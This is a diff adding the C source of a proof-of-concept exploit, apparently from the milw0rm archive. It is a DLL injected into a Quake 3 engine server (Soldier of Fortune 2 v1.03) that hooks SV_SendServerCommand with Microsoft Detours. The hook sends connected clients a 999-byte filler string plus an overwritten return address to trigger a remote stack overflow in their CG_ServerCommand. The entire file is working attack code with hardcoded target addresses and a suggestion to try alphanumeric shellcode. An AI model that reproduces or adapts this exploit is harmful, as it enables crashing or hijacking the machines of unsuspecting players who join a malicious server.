@@ -1,0 +1,83 @@
+/*
+Quake 3 Engine Client CG_ServerCommand() Remote Stack Overflow Exploit (Win32)
+Written by RunningBon
+
+E-Mail: runningbon@gmail.com
+IRC: irc.rizon.net #kik
+
+This is a DLL, which gets injected into the server exe.
+
+You will need Microsoft Detours library to compile this exploit (http://research.microsoft.com/sn/detours/)
+
+Use this responsibly. You are responsible for any damage you cause using this.
+
+Info:
+The string is heavily filtered before the overflow occurs, so a lot of bytes get stripped. Might want to try alphanum shellcode..
+*/
+
+#include <stdio.h>
+#include <windows.h>
+#include <detours.h>
+
+struct VersionStruct {
+	char *pVersionString;
+	DWORD dwVersionStringAddr;
+	DWORD dwSendServerCommandAddr;
+	DWORD dwFillSize;
+	DWORD dwNewEIP;
+};
+
+VersionStruct Versions[] = {
+	{ "SOF2MP GOLD V1.03", 0x5598F8, 0x478660, 999, 0x33333333 },	//SoF2 1.03
+};
+
+VersionStruct *pVersion = NULL;
+
+void (*orig_SV_SendServerCommand)(LPVOID pCl, const char *fmt, ...);
+void SV_SendServerCommand_Hook(LPVOID pCl, const char *fmt, ...)
+{
+	char szString[4096];
+	char *pPtr = NULL;
+
+	if(pVersion != NULL)
+	{
+		memset(szString, 0, sizeof(szString));
+		pPtr = &szString[0];
+
+		memset(pPtr, 'a', pVersion->dwFillSize);
+		pPtr += pVersion->dwFillSize;
+
+		memcpy(pPtr, (LPVOID)&pVersion->dwNewEIP, sizeof(DWORD));
+		pPtr += sizeof(DWORD);
+
+		orig_SV_SendServerCommand(pCl, szString);
+	}
+}
+
+bool WINAPI DllMain(HINSTANCE hInst, DWORD dwReason, LPVOID lpReserved)
+{
+	if(dwReason == DLL_PROCESS_ATTACH)
+	{
+		for(int i = 0; i < sizeof(Versions) / sizeof(Versions[0]); i++)
+		{
+			if(!stricmp((char*)Versions[i].dwVersionStringAddr, Versions[i].pVersionString))
+			{
+				pVersion = &Versions[i];
+				break;
+			}
+		}
+
+		if(pVersion == NULL)
+		{
+			//Could not find correct version
+			return 1;
+		}
+
+		DetourFunction((BYTE*)pVersion->dwSendServerCommandAddr, (BYTE*)SV_SendServerCommand_Hook);
+		_asm mov [orig_SV_SendServerCommand], eax
+	}
+
+	return 1;
+}
+
+// milw0rm.com [2006-07-02]
